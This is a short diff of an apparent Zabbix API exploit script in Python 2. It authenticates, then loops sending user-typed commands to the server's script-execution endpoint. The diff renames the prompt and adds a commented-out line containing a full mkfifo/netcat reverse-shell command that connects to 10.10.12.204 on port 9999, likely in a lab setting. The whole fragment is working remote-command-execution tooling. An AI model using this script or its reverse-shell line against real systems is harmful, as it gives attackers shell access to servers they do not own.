@@ -41,7 +41,7 @@ auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
 auth = auth.json()
 
 while True:
-    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
+    cmd = raw_input('\033[41m[cmd]>>: \033[0m ')
     if cmd == "" : print "Result of last command:"
     if cmd == "quit" : break
 
@@ -52,6 +52,7 @@ while True:
         "params": {
             "scriptid": "1",
             "command": ""+cmd+"",
+            #"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.204 9999 >/tmp/f",
             "execute_on":0
         },
         "auth" : auth['result'],
